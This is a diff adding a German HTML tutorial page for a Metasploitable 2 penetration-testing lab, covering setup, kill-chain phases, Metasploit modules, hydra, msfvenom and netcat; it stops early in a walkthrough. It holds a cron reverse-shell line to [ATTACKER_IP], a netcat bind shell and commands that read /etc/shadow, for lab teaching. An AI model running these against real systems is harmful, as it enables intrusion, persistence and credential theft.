@@ -1,0 +1,1133 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>METASPLOITABLE 2 - PENTESTING LABOR</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono:wght@400&family=Orbitron:wght@400;500;600;700;900&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Legal Warning Modal -->
+    <div id="legalWarning" class="warning-modal">
+        <div class="warning-modal__content">
+            <div class="warning-modal__header">
+                <h2>⚠️ RECHTLICHE WARNUNG</h2>
+            </div>
+            <div class="warning-modal__body">
+                <p>Diese Dokumentation ist ausschließlich für Bildungs- und Testzwecke in autorisierten Umgebungen bestimmt.</p>
+                <ul>
+                    <li>Verwende diese Tools nur in eigenen oder explizit autorisierten Systemen</li>
+                    <li>Unbefugtes Eindringen in fremde Systeme ist strafbar (§ 202a-c StGB)</li>
+                    <li>Du übernimmst die volle Verantwortung für deine Handlungen</li>
+                    <li>Diese Anleitung dient ausschließlich der Cybersecurity-Bildung</li>
+                </ul>
+                <p class="warning-emphasis">Durch das Fortfahren bestätigst du, dass du diese Bedingungen verstehst und einhältst.</p>
+            </div>
+            <div class="warning-modal__footer">
+                <button id="acceptWarning" class="btn btn--primary">Ich verstehe und akzeptiere</button>
+                <button id="declineWarning" class="btn btn--outline">Ablehnen</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Application -->
+    <div id="mainApp" class="app hidden">
+        <!-- Header -->
+        <header class="header">
+            <div class="container">
+                <div class="header__content">
+                    <div class="header__title">
+                        <h1 class="matrix-title">METASPLOITABLE 2</h1>
+                        <p class="header__subtitle">Ethical Hacking & Penetration Testing Documentation</p>
+                    </div>
+                    <div class="header__controls">
+                        <button id="searchBtn" class="btn btn--outline btn--sm">
+                            <span class="key-combo">Ctrl+K</span> Suchen
+                        </button>
+                        <button id="themeToggle" class="btn btn--outline btn--sm">Matrix Mode</button>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Navigation -->
+        <nav class="nav">
+            <div class="container">
+                <div class="nav__tabs">
+                    <button class="nav__tab active" data-tab="home">🏠 HOME</button>
+                    <button class="nav__tab" data-tab="installation">💻 INSTALLATION</button>
+                    <button class="nav__tab" data-tab="killchain">💀 KILL CHAIN</button>
+                    <button class="nav__tab" data-tab="exploits">💥 EXPLOITS</button>
+                    <button class="nav__tab" data-tab="legal">⚖️ LEGAL</button>
+                    <button class="nav__tab" data-tab="tools">🛠️ TOOLS</button>
+                    <button class="nav__tab" data-tab="walkthrough">⚔️ WALKTHROUGH</button>
+                </div>
+            </div>
+        </nav>
+
+        <!-- Main Content -->
+        <main class="main">
+            <div class="container">
+                <!-- HOME Tab -->
+                <div class="tab-content active" id="home">
+                    <div class="intro-section">
+                        <div class="card matrix-card">
+                            <div class="card__body">
+                                <h2>Willkommen im Metasploitable 2 Labor</h2>
+                                <p>Metasploitable 2 ist eine absichtlich verwundbare Ubuntu-VM (Version 8.04), die speziell für das Training von Penetration Testing und Ethical Hacking entwickelt wurde.</p>
+                                
+                                <div class="status status--warning">
+                                    <strong>⚠️ Sicherheitswarnung:</strong> Diese VM niemals in einem produktiven Netzwerk verwenden!
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="grid">
+                        <div class="card matrix-card">
+                            <div class="card__body">
+                                <h3>Was ist Metasploitable 2?</h3>
+                                <ul>
+                                    <li><strong>Betriebssystem:</strong> Ubuntu 8.04 Linux</li>
+                                    <li><strong>Größe:</strong> ~800MB komprimiert</li>
+                                    <li><strong>Zweck:</strong> Penetration Testing Training</li>
+                                    <li><strong>Sicherheitslevel:</strong> Absichtlich verwundbar</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <div class="card matrix-card">
+                            <div class="card__body">
+                                <h3>System Requirements</h3>
+                                <ul>
+                                    <li><strong>RAM:</strong> Minimum 512MB (empfohlen 2GB)</li>
+                                    <li><strong>Festplatte:</strong> 8GB freier Speicher</li>
+                                    <li><strong>Virtualisierung:</strong> VirtualBox/VMware</li>
+                                    <li><strong>Netzwerk:</strong> Host-Only/NAT (kein Internet!)</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <div class="card matrix-card">
+                            <div class="card__body">
+                                <h3>Default Login-Daten</h3>
+                                <div class="code-block">
+                                    <code>
+Benutzername: msfadmin<br>
+Passwort: msfadmin<br><br>
+MySQL root: (leer)<br>
+PostgreSQL: postgres/postgres
+                                    </code>
+                                    <button class="copy-btn" data-copy="msfadmin">Kopieren</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card matrix-card">
+                        <div class="card__body">
+                            <h3>Wichtige Sicherheitshinweise</h3>
+                            <div class="status-grid">
+                                <div class="status status--error">
+                                    <strong>NIEMALS in Produktionsumgebung verwenden</strong>
+                                </div>
+                                <div class="status status--warning">
+                                    <strong>Nur in isolierten Netzwerken betreiben</strong>
+                                </div>
+                                <div class="status status--info">
+                                    <strong>Regelmäßige Snapshots erstellen</strong>
+                                </div>
+                                <div class="status status--success">
+                                    <strong>Für Bildungszwecke optimiert</strong>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- INSTALLATION Tab -->
+                <div class="tab-content" id="installation">
+                    <h2>Installation & Setup</h2>
+                    
+                    <div class="grid">
+                        <div class="card matrix-card">
+                            <div class="card__body">
+                                <h3>🔧 VirtualBox Installation</h3>
+                                <div class="step-list">
+                                    <div class="step">
+                                        <div class="step__number">1</div>
+                                        <div class="step__content">
+                                            <h4>Download Metasploitable 2</h4>
+                                            <p>Lade die VM von SourceForge herunter</p>
+                                            <div class="code-block">
+                                                <code>wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip</code>
+                                                <button class="copy-btn" data-copy="wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip">Kopieren</button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="step">
+                                        <div class="step__number">2</div>
+                                        <div class="step__content">
+                                            <h4>VM in VirtualBox erstellen</h4>
+                                            <p>Neue VM → Linux → Ubuntu (64-bit) → 2GB RAM</p>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="step">
+                                        <div class="step__number">3</div>
+                                        <div class="step__content">
+                                            <h4>VMDK Datei einbinden</h4>
+                                            <p>Extrahiere die ZIP und verwende die .vmdk Datei als Festplatte</p>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="step">
+                                        <div class="step__number">4</div>
+                                        <div class="step__content">
+                                            <h4>Netzwerk konfigurieren</h4>
+                                            <p>Host-Only Adapter für isolierte Umgebung</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="card matrix-card">
+                            <div class="card__body">
+                                <h3>🖥️ VMware Installation</h3>
+                                <div class="step-list">
+                                    <div class="step">
+                                        <div class="step__number">1</div>
+                                        <div class="step__content">
+                                            <h4>VMware Workstation/Player öffnen</h4>
+                                            <p>Open a Virtual Machine → VMDK auswählen</p>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="step">
+                                        <div class="step__number">2</div>
+                                        <div class="step__content">
+                                            <h4>VM-Einstellungen anpassen</h4>
+                                            <p>Memory: 2GB, Network: Host-Only</p>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="step">
+                                        <div class="step__number">3</div>
+                                        <div class="step__content">
+                                            <h4>Erste Inbetriebnahme</h4>
+                                            <p>VM starten → Login: msfadmin/msfadmin</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card matrix-card">
+                        <div class="card__body">
+                            <h3>Netzwerkkonfiguration</h3>
+                            <p>Die korrekte Netzwerkkonfiguration ist kritisch für die Sicherheit:</p>
+                            <div class="code-block">
+                                <code>
+# IP-Adresse ermitteln
+ifconfig
+
+# Netzwerkverbindung testen
+ping 192.168.1.1
+
+# SSH-Zugriff testen
+ssh msfadmin@[METASPLOITABLE_IP]
+                                </code>
+                                <button class="copy-btn" data-copy="ifconfig">Kopieren</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- KILL CHAIN Tab -->
+                <div class="tab-content" id="killchain">
+                    <h2>Cyber Kill Chain Phasen</h2>
+                    <p>Systematische Herangehensweise für Penetration Testing</p>
+                    
+                    <div class="killchain-grid">
+                        <div class="killchain-phase">
+                            <div class="phase-number">1</div>
+                            <div class="card matrix-card">
+                                <div class="card__body">
+                                    <h3>🔍 Reconnaissance</h3>
+                                    <p><strong>Informationssammlung über das Zielsystem</strong></p>
+                                    <div class="code-block">
+                                        <code>nmap -sV -O [TARGET_IP]</code>
+                                        <button class="copy-btn" data-copy="nmap -sV -O [TARGET_IP]">Kopieren</button>
+                                    </div>
+                                    <ul>
+                                        <li>Port-Scanning mit Nmap</li>
+                                        <li>Service-Erkennung</li>
+                                        <li>OS-Fingerprinting</li>
+                                        <li>Banner Grabbing</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="killchain-phase">
+                            <div class="phase-number">2</div>
+                            <div class="card matrix-card">
+                                <div class="card__body">
+                                    <h3>🔨 Weaponization</h3>
+                                    <p><strong>Erstellung oder Beschaffung von Exploits</strong></p>
+                                    <div class="code-block">
+                                        <code>msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor</code>
+                                        <button class="copy-btn" data-copy="msfconsole">Kopieren</button>
+                                    </div>
+                                    <ul>
+                                        <li>Metasploit Framework</li>
+                                        <li>Custom Exploit Development</li>
+                                        <li>Payload Generation</li>
+                                        <li>Exploit-DB Recherche</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="killchain-phase">
+                            <div class="phase-number">3</div>
+                            <div class="card matrix-card">
+                                <div class="card__body">
+                                    <h3>📨 Delivery</h3>
+                                    <p><strong>Übertragung der Exploits zum Ziel</strong></p>
+                                    <ul>
+                                        <li>Direkter Netzwerkzugriff</li>
+                                        <li>Social Engineering</li>
+                                        <li>Email-basierte Angriffe</li>
+                                        <li>Web-basierte Exploits</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="killchain-phase">
+                            <div class="phase-number">4</div>
+                            <div class="card matrix-card">
+                                <div class="card__body">
+                                    <h3>💥 Exploitation</h3>
+                                    <p><strong>Ausnutzung von Schwachstellen</strong></p>
+                                    <div class="code-block">
+                                        <code>set RHOST [TARGET_IP]
+set RPORT 21
+exploit</code>
+                                        <button class="copy-btn" data-copy="set RHOST [TARGET_IP]">Kopieren</button>
+                                    </div>
+                                    <ul>
+                                        <li>vsftpd 2.3.4 Backdoor</li>
+                                        <li>UnrealIRCd Backdoor</li>
+                                        <li>distcc Command Execution</li>
+                                        <li>Samba Exploits</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="killchain-phase">
+                            <div class="phase-number">5</div>
+                            <div class="card matrix-card">
+                                <div class="card__body">
+                                    <h3>⚙️ Installation</h3>
+                                    <p><strong>Installation von Persistenzmechanismen</strong></p>
+                                    <div class="code-block">
+                                        <code># Backdoor installieren
+echo "* * * * * /bin/bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1" | crontab -</code>
+                                        <button class="copy-btn" data-copy="echo '* * * * * /bin/bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1' | crontab -">Kopieren</button>
+                                    </div>
+                                    <ul>
+                                        <li>Backdoors einrichten</li>
+                                        <li>Cron Jobs erstellen</li>
+                                        <li>SSH-Keys hinterlegen</li>
+                                        <li>Rootkits installieren</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="killchain-phase">
+                            <div class="phase-number">6</div>
+                            <div class="card matrix-card">
+                                <div class="card__body">
+                                    <h3>📡 Command & Control</h3>
+                                    <p><strong>Kommunikation mit kompromittiertem System</strong></p>
+                                    <div class="code-block">
+                                        <code># Reverse Shell starten
+nc -lvnp 4444</code>
+                                        <button class="copy-btn" data-copy="nc -lvnp 4444">Kopieren</button>
+                                    </div>
+                                    <ul>
+                                        <li>Reverse Shells</li>
+                                        <li>Meterpreter Sessions</li>
+                                        <li>HTTP/HTTPS Tunnels</li>
+                                        <li>Covert Channels</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="killchain-phase">
+                            <div class="phase-number">7</div>
+                            <div class="card matrix-card">
+                                <div class="card__body">
+                                    <h3>🎯 Actions on Objectives</h3>
+                                    <p><strong>Erreichen der Angriffsziele</strong></p>
+                                    <div class="code-block">
+                                        <code># Privilege Escalation
+sudo -l
+find / -perm -4000 -type f 2>/dev/null</code>
+                                        <button class="copy-btn" data-copy="sudo -l">Kopieren</button>
+                                    </div>
+                                    <ul>
+                                        <li>Datenexfiltration</li>
+                                        <li>Privilege Escalation</li>
+                                        <li>Lateral Movement</li>
+                                        <li>System Manipulation</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- EXPLOITS Tab -->
+                <div class="tab-content" id="exploits">
+                    <h2>Praktische Exploits</h2>
+                    
+                    <div class="exploit-grid">
+                        <div class="card matrix-card exploit-card">
+                            <div class="card__body">
+                                <div class="exploit-header">
+                                    <h3>vsftpd 2.3.4 Backdoor</h3>
+                                    <div class="status status--error">Critical</div>
+                                </div>
+                                <p><strong>Port:</strong> 21 | <strong>CVE:</strong> CVE-2011-2523</p>
+                                <div class="code-block">
+                                    <code>use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST [TARGET_IP]
+exploit</code>
+                                    <button class="copy-btn" data-copy="use exploit/unix/ftp/vsftpd_234_backdoor">Kopieren</button>
+                                </div>
+                                <p>Backdoor in der vsftpd 2.3.4 Version ermöglicht direkten Root-Zugriff.</p>
+                            </div>
+                        </div>
+
+                        <div class="card matrix-card exploit-card">
+                            <div class="card__body">
+                                <div class="exploit-header">
+                                    <h3>UnrealIRCd 3.2.8.1 Backdoor</h3>
+                                    <div class="status status--error">Critical</div>
+                                </div>
+                                <p><strong>Port:</strong> 6667 | <strong>CVE:</strong> CVE-2010-2075</p>
+                                <div class="code-block">
+                                    <code>use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOST [TARGET_IP]
+set RPORT 6667
+exploit</code>
+                                    <button class="copy-btn" data-copy="use exploit/unix/irc/unreal_ircd_3281_backdoor">Kopieren</button>
+                                </div>
+                                <p>Malicious Backdoor im UnrealIRCd Daemon für Command Execution.</p>
+                            </div>
+                        </div>
+
+                        <div class="card matrix-card exploit-card">
+                            <div class="card__body">
+                                <div class="exploit-header">
+                                    <h3>distcc Daemon Exploit</h3>
+                                    <div class="status status--warning">High</div>
+                                </div>
+                                <p><strong>Port:</strong> 3632 | <strong>CVE:</strong> CVE-2004-2687</p>
+                                <div class="code-block">
+                                    <code>use exploit/unix/misc/distcc_exec
+set RHOST [TARGET_IP]
+set PAYLOAD cmd/unix/bind_netcat
+exploit</code>
+                                    <button class="copy-btn" data-copy="use exploit/unix/misc/distcc_exec">Kopieren</button>
+                                </div>
+                                <p>Remote Command Execution über den distcc Daemon.</p>
+                            </div>
+                        </div>
+
+                        <div class="card matrix-card exploit-card">
+                            <div class="card__body">
+                                <div class="exploit-header">
+                                    <h3>SSH Brute Force</h3>
+                                    <div class="status status--info">Medium</div>
+                                </div>
+                                <p><strong>Port:</strong> 22 | <strong>Methode:</strong> Brute Force</p>
+                                <div class="code-block">
+                                    <code>hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://[TARGET_IP] -t 4</code>
+                                    <button class="copy-btn" data-copy="hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://[TARGET_IP] -t 4">Kopieren</button>
+                                </div>
+                                <p>Brute Force Angriff gegen SSH mit schwachen Credentials.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card matrix-card">
+                        <div class="card__body">
+                            <h3>Post-Exploitation Techniken</h3>
+                            <div class="grid">
+                                <div class="technique">
+                                    <h4>🔓 Privilege Escalation</h4>
+                                    <div class="code-block">
+                                        <code># SUID Binaries finden
+find / -perm -4000 -type f 2>/dev/null
+
+# Kernel Exploits
+uname -a
+searchsploit linux kernel 2.6</code>
+                                        <button class="copy-btn" data-copy="find / -perm -4000 -type f 2>/dev/null">Kopieren</button>
+                                    </div>
+                                </div>
+                                <div class="technique">
+                                    <h4>📂 Datenexfiltration</h4>
+                                    <div class="code-block">
+                                        <code># Sensitive Dateien finden
+find /home -name "*.txt" -o -name "*.pdf"
+cat /etc/passwd
+cat /etc/shadow</code>
+                                        <button class="copy-btn" data-copy="find /home -name '*.txt' -o -name '*.pdf'">Kopieren</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LEGAL Tab -->
+                <div class="tab-content" id="legal">
+                    <h2>Rechtliche Grundlagen</h2>
+                    
+                    <div class="legal-warning">
+                        <div class="status status--error">
+                            <strong>⚖️ Wichtiger rechtlicher Hinweis:</strong> Die Verwendung dieser Tools und Techniken ist nur in autorisierten Umgebungen legal!
+                        </div>
+                    </div>
+
+                    <div class="grid">
+                        <div class="card matrix-card">
+                            <div class="card__body">
+                                <h3>🇩🇪 Deutsche Rechtslage</h3>
+                                <div class="law-section">
+                                    <h4>§ 202a StGB - Ausspähen von Daten</h4>
+                                    <p>Wer unbefugt sich oder einem anderen Zugang zu Daten verschafft, die nicht für ihn bestimmt sind...</p>
+                                    <div class="status status--error">Strafe: bis zu 3 Jahre Freiheitsstrafe oder Geldstrafe</div>
+                                </div>
+                                
+                                <div class="law-section">
+                                    <h4>§ 202b StGB - Abfangen von Daten</h4>
+                                    <p>Wer unbefugt sich oder einem anderen unter Anwendung technischer Mittel nicht für ihn bestimmte Daten verschafft...</p>
+                                    <div class="status status--error">Strafe: bis zu 2 Jahre Freiheitsstrafe oder Geldstrafe</div>
+                                </div>
+
+                                <div class="law-section">
+                                    <h4>§ 202c StGB - Vorbereiten des Ausspähens und Abfangens von Daten</h4>
+                                    <p>Wer Computerprogramme, deren Zweck die Begehung einer Tat nach § 202a oder § 202b ist, herstellt oder sich verschafft...</p>
+                                    <div class="status status--warning">Strafe: bis zu 1 Jahr Freiheitsstrafe oder Geldstrafe</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="card matrix-card">
+                            <div class="card__body">
+                                <h3>🛡️ DSGVO Compliance</h3>
+                                <h4>Art. 32 DSGVO - Sicherheit der Verarbeitung</h4>
+                                <p>Unter Berücksichtigung des Stands der Technik und der Implementierungskosten müssen angemessene technische und organisatorische Maßnahmen getroffen werden:</p>
+                                <ul>
+                                    <li>Pseudonymisierung und Verschlüsselung</li>
+                                    <li>Gewährleistung der Vertraulichkeit, Integrität, Verfügbarkeit</li>
+                                    <li>Wiederherstellbarkeit der Verfügbarkeit</li>
+                                    <li>Regelmäßige Überprüfung der Wirksamkeit</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card matrix-card">
+                        <div class="card__body">
+                            <h3>✅ Ethical Hacking Prinzipien</h3>
+                            <div class="ethics-grid">
+                                <div class="ethic-principle">
+                                    <h4>🎯 Autorisierung</h4>
+                                    <p>Teste nur Systeme, für die du explizite Genehmigung hast</p>
+                                </div>
+                                <div class="ethic-principle">
+                                    <h4>🛡️ Schadensvermeidung</h4>
+                                    <p>Vermeide jegliche Beschädigung oder Beeinträchtigung der Systeme</p>
+                                </div>
+                                <div class="ethic-principle">
+                                    <h4>🔒 Vertraulichkeit</h4>
+                                    <p>Behandle alle gefundenen Informationen vertraulich</p>
+                                </div>
+                                <div class="ethic-principle">
+                                    <h4>📋 Dokumentation</h4>
+                                    <p>Dokumentiere alle Aktivitäten für spätere Analyse</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card matrix-card">
+                        <div class="card__body">
+                            <h3>⚠️ Haftungsausschluss</h3>
+                            <div class="disclaimer">
+                                <p><strong>Diese Dokumentation dient ausschließlich Bildungszwecken.</strong></p>
+                                <ul>
+                                    <li>Der Autor übernimmt keine Haftung für Schäden durch unsachgemäße Verwendung</li>
+                                    <li>Jeder Nutzer ist selbst für die Einhaltung geltender Gesetze verantwortlich</li>
+                                    <li>Die beschriebenen Techniken sind nur in autorisierten Testumgebungen anzuwenden</li>
+                                    <li>Bei Verstößen gegen geltendes Recht drohen erhebliche Strafen</li>
+                                </ul>
+                                <div class="status status--error">
+                                    <strong>Die Nutzung dieser Anleitung geschieht auf eigenes Risiko!</strong>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TOOLS Tab -->
+                <div class="tab-content" id="tools">
+                    <h2>Pentesting Tools & Commands</h2>
+                    
+                    <div class="tools-grid">
+                        <div class="card matrix-card tool-card">
+                            <div class="card__body">
+                                <div class="tool-header">
+                                    <h3>🗺️ Nmap - Network Mapper</h3>
+                                    <div class="status status--info">Network Discovery</div>
+                                </div>
+                                <p>Der Standard für Netzwerk-Reconnaissance und Port-Scanning</p>
+                                
+                                <div class="command-section">
+                                    <h4>Basic Scans</h4>
+                                    <div class="code-block">
+                                        <code># TCP SYN Scan
+nmap -sS [TARGET_IP]
+
+# Service Version Detection
+nmap -sV [TARGET_IP]
+
+# OS Detection
+nmap -O [TARGET_IP]
+
+# Comprehensive Scan
+nmap -sS -sV -O -p- [TARGET_IP]</code>
+                                        <button class="copy-btn" data-copy="nmap -sS -sV -O -p- [TARGET_IP]">Kopieren</button>
+                                    </div>
+                                </div>
+
+                                <div class="command-section">
+                                    <h4>NSE Scripts</h4>
+                                    <div class="code-block">
+                                        <code># Vulnerability Scanning
+nmap --script vuln [TARGET_IP]
+
+# SMB Enumeration
+nmap --script smb-enum-* [TARGET_IP]
+
+# HTTP Enumeration
+nmap --script http-enum [TARGET_IP]</code>
+                                        <button class="copy-btn" data-copy="nmap --script vuln [TARGET_IP]">Kopieren</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="card matrix-card tool-card">
+                            <div class="card__body">
+                                <div class="tool-header">
+                                    <h3>🚀 Metasploit Framework</h3>
+                                    <div class="status status--error">Exploitation</div>
+                                </div>
+                                <p>Das mächtigste Exploitation Framework für Penetration Testing</p>
+                                
+                                <div class="command-section">
+                                    <h4>Basic Commands</h4>
+                                    <div class="code-block">
+                                        <code># Framework starten
+msfconsole
+
+# Exploit suchen
+search vsftpd
+
+# Exploit laden
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+# Optionen anzeigen
+show options
+
+# Ziel setzen
+set RHOST [TARGET_IP]
+
+# Exploit ausführen
+exploit</code>
+                                        <button class="copy-btn" data-copy="msfconsole">Kopieren</button>
+                                    </div>
+                                </div>
+
+                                <div class="command-section">
+                                    <h4>Payload Generation</h4>
+                                    <div class="code-block">
+                                        <code># Reverse Shell Payload
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=4444 -f elf > shell.elf
+
+# Meterpreter Payload
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=4444 -f elf > meterpreter.elf</code>
+                                        <button class="copy-btn" data-copy="msfvenom -p linux/x86/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=4444 -f elf > shell.elf">Kopieren</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="card matrix-card tool-card">
+                            <div class="card__body">
+                                <div class="tool-header">
+                                    <h3>🌊 Hydra - Password Cracker</h3>
+                                    <div class="status status--warning">Brute Force</div>
+                                </div>
+                                <p>Schneller Netzwerk-Login-Cracker für verschiedene Protokolle</p>
+                                
+                                <div class="command-section">
+                                    <h4>Protocol Attacks</h4>
+                                    <div class="code-block">
+                                        <code># SSH Brute Force
+hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://[TARGET_IP]
+
+# FTP Brute Force
+hydra -L users.txt -P passwords.txt ftp://[TARGET_IP]
+
+# HTTP POST Form
+hydra -l admin -P passwords.txt [TARGET_IP] http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
+
+# SMB/NetBIOS
+hydra -L users.txt -P passwords.txt [TARGET_IP] smb</code>
+                                        <button class="copy-btn" data-copy="hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://[TARGET_IP]">Kopieren</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="card matrix-card tool-card">
+                            <div class="card__body">
+                                <div class="tool-header">
+                                    <h3>🔍 Nikto - Web Scanner</h3>
+                                    <div class="status status--info">Web Assessment</div>
+                                </div>
+                                <p>Web-Server-Scanner für Schwachstellen und Fehlkonfigurationen</p>
+                                
+                                <div class="command-section">
+                                    <h4>Web Scanning</h4>
+                                    <div class="code-block">
+                                        <code># Basic Web Scan
+nikto -h [TARGET_IP]
+
+# Port-spezifischer Scan
+nikto -h [TARGET_IP] -p 80,443,8080
+
+# Mit SSL
+nikto -h https://[TARGET_IP]
+
+# Output zu Datei
+nikto -h [TARGET_IP] -o scan_results.txt</code>
+                                        <button class="copy-btn" data-copy="nikto -h [TARGET_IP]">Kopieren</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="card matrix-card tool-card">
+                            <div class="card__body">
+                                <div class="tool-header">
+                                    <h3>🐧 Netcat - Network Swiss Army Knife</h3>
+                                    <div class="status status--success">Networking</div>
+                                </div>
+                                <p>Vielseitiges Netzwerk-Tool für verschiedene TCP/UDP-Operationen</p>
+                                
+                                <div class="command-section">
+                                    <h4>Shell Operations</h4>
+                                    <div class="code-block">
+                                        <code># Listener für Reverse Shell
+nc -lvnp 4444
+
+# Bind Shell erstellen
+nc -lvnp 4444 -e /bin/bash
+
+# Port Scanning
+nc -zv [TARGET_IP] 1-1000
+
+# Banner Grabbing
+nc [TARGET_IP] 80</code>
+                                        <button class="copy-btn" data-copy="nc -lvnp 4444">Kopieren</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="card matrix-card tool-card">
+                            <div class="card__body">
+                                <div class="tool-header">
+                                    <h3>📋 enum4linux - SMB Enumerator</h3>
+                                    <div class="status status--info">SMB Enumeration</div>
+                                </div>
+                                <p>Spezialisiertes Tool für SMB/NetBIOS-Enumeration auf Linux-Systemen</p>
+                                
+                                <div class="command-section">
+                                    <h4>SMB Enumeration</h4>
+                                    <div class="code-block">
+                                        <code># Vollständige Enumeration
+enum4linux -a [TARGET_IP]
+
+# Benutzer auflisten
+enum4linux -U [TARGET_IP]
+
+# Shares auflisten
+enum4linux -S [TARGET_IP]
+
+# Passwort-Policy
+enum4linux -P [TARGET_IP]</code>
+                                        <button class="copy-btn" data-copy="enum4linux -a [TARGET_IP]">Kopieren</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- WALKTHROUGH Tab (NEW!) -->
+                <div class="tab-content" id="walkthrough">
+                    <h2>⚔️ VSFTPD Kill-Chain Walkthrough</h2>
+                    <p>Vollständiger Praxis-Lehrpfad durch alle sieben Phasen der Cyber Kill Chain am Beispiel des VSFTPD-Backdoors (CVE-2011-2523)</p>
+                    
+                    <div class="status status--warning">
+                        <strong>⚠️ Praxis-Warnung:</strong> Dieser Walkthrough zeigt eine reale Angriffskette. Nur in autorisierten Testumgebungen verwenden!
+                    </div>
+
+                    <div class="walkthrough-grid">
+                        <!-- Phase 1: Reconnaissance -->
+                        <div class="walkthrough-phase">
+                            <div class="phase-number">1</div>
+                            <div class="card matrix-card">
+                                <div class="card__body">
+                                    <h3>🔍 Reconnaissance</h3>
+                                    <p><strong>Ziel:</strong> Service- und Versionserkennung</p>
+                                    
+                                    <div class="walkthrough-step">
+                                        <h4>Schritt 1: Netzwerk-Sichtung</h4>
+                                        <div class="code-block">
+                                            <code>netdiscover -r 192.168.56.0/24</code>
+                                            <button class="copy-btn" data-copy="netdiscover -r 192.168.56.0/24">Kopieren</button>
+                                        </div>
+                                        <p><strong>Zweck:</strong> Findet die VM-IP (z.B. 192.168.56.101)</p>
+                                    </div>
+
+                                    <div class="walkthrough-step">
+                                        <h4>Schritt 2: Vollständiger Port-Scan</h4>
+                                        <div class="code-block">
+                                            <code>nmap -sS -sV -O -p- 192.168.56.101</code>
+                                            <button class="copy-btn" data-copy="nmap -sS -sV -O -p- 192.168.56.101">Kopieren</button>
+                                        </div>
+                                        <p><strong>Zweck:</strong> TCP-Stealth-Scan mit Service- & OS-Erkennung. Banner verraten vsftpd 2.3.4 auf Port 21.</p>
+                                    </div>
+
+                                    <div class="walkthrough-step">
+                                        <h4>Schritt 3: Schwachstellen-Validierung</h4>
+                                        <div class="code-block">
+                                            <code>nmap --script ftp-vsftpd-backdoor -p 21 192.168.56.101</code>
+                                            <button class="copy-btn" data-copy="nmap --script ftp-vsftpd-backdoor -p 21 192.168.56.101">Kopieren</button>
+                                        </div>
+                                        <p><strong>Zweck:</strong> NSE-Skript meldet 'VULNERABLE' und bestätigt Backdoor-Port 6200.</p>
+                                    </div>
+
+                                    <div class="defense-note">
+                                        <h4>🛡️ Verteidigung</h4>
+                                        <p>Banner-Grabbing blockieren oder Banner anonymisieren; automatische Schwachstellen-Scanner im Netz segmentiert ausführen.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Phase 2: Weaponization -->
+                        <div class="walkthrough-phase">
+                            <div class="phase-number">2</div>
+                            <div class="card matrix-card">
+                                <div class="card__body">
+                                    <h3>🔨 Weaponization</h3>
+                                    <p><strong>Ziel:</strong> Exploit bereitstellen</p>
+                                    
+                                    <div class="walkthrough-step">
